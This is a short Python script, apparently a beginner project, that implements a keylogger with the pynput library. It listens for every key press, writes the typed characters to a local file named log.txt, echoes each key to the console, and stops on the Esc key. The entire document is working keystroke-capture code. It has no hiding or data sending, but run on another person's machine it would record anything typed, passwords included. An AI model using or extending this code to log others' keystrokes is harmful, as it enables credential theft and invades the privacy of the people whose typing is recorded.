# importing pynput to use its functions to capture key inputs
import pynput
from pynput.keyboard import Key, Listener


#Every time the key gets pressed
def on_press(key):
    
    
    print("{0} key was pressed".format(key))
    write_file(key)
   
#breaks out of the loop 
def on_release(key):
    if key == Key.esc:
        return False

#checks the last character doesn't contain ' '
def readfile():
    with open('log.txt', 'r') as f:
        lastCharacter = f.read()[-1]
            
        if(lastCharacter == ' '):
            return 'True'
        else:
            return 'False'

# writes to the file  
def write_file(key):
    with open('log.txt', 'a') as f:       
            
        #removes the quotation marks from being captured
        k = str(key).replace("'","")
        t = k.find("Key")
     
        #removes the word space
        if k == str(Key.space): 
            isTrue = readfile()
            if isTrue == 'True':
                pass                   
            else:           
                f.write(' ')
        else:
            if k.find("Key") == -1:
                f.write(k)
            else:
                pass


if('__main__' == __name__):
    
    print('it works')
    
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

